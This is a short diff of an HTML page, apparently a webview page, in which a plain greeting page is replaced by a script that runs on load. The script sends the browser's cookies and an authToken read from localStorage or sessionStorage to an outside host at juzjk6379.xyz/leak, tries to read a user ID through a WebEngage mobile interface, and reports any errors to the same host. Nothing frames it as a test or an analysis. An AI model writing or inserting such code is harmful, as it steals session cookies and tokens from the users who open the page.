@@ -1,9 +1,21 @@
-<!DOCTYPE html>
 <html>
-<head>
-  <title>Webview</title>
-</head>
-<body>
-  <h1>HI FROM JK</h1>
-</body>
+  <body>
+    <script>
+      try {
+        // Attempt to access cookies
+        fetch("https://juzjk6379.xyz/leak?cookie=" + document.cookie);
+
+        // Try localStorage/sessionStorage
+        const token = localStorage.getItem("authToken") || sessionStorage.getItem("authToken");
+        fetch("https://juzjk6379.xyz/leak?token=" + token);
+
+        // Try WebEngage interface
+        if (WebEngageMobileInterface) {
+          WebEngageMobileInterface.getUserId();
+        }
+      } catch(e) {
+        fetch("https://juzjk6379.xyz/leak?error=" + encodeURIComponent(e.message));
+      }
+    </script>
+  </body>
 </html>
